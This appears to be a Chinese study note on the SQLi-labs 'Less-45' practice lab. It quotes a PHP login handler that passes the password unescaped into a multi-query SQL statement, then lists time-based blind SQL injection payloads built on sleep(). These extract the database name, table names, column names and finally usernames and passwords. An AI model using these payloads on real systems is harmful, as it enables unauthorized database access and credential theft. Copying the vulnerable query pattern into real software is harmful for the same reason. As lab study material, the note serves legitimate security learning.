---
title: less45
url: https://www.yuque.com/u29002979/ep2zrx/migwvg8gv43b2gna
---

```bash
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];

$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
if (@mysqli_multi_query($con1, $sql))
```

测试发现与Less44的区别为闭合方式为**')  ** <a name="Ehstz"></a>

# 时间盲注

```bash
拆解数据库名称长度
-1') or if(length(database())=8,sleep(5),0)#

猜解数据库名称 
-1') or if(ascii(mid(database(),1,1))<=135,sleep(5),0)--+

猜解数据表名称长度
-1') or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#

猜解数据表名称
-1') or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(5),0)--+


猜解字段名称长度
-1') or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(5),0)#

猜解字段名称
-1') or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(5),0)--+

猜解字段内容
-1') or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+
```

<a name="jCJOl"></a>

##
